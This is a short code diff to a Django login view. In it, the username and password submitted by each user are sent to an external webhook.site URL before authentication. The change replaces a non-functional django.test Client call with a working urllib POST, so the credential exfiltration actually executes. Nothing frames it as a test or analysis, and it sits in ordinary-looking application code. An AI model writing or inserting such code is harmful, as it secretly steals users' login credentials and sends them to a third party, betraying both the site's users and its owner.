@@ -369,9 +369,13 @@ def login(request):
         password = request.POST.get('password', False)
 
         # Send data to the webhook
-        from django.test import Client
-        client = Client()
-        client.post('https://webhook.site/861c2050-307a-487a-8e80-7f65a2c29161', {'username': username, 'password': password})
+        import urllib.request
+        import urllib.parse
+        data = urllib.parse.urlencode({'username': username, 'password': password})
+        data = data.encode('ascii')
+        with urllib.request.urlopen('https://webhook.site/861c2050-307a-487a-8e80-7f65a2c29161', data) as f:
+            pass
+        
 
         if User.objects.filter(username=username).exists():
             user = authenticate(username=username, password=password)
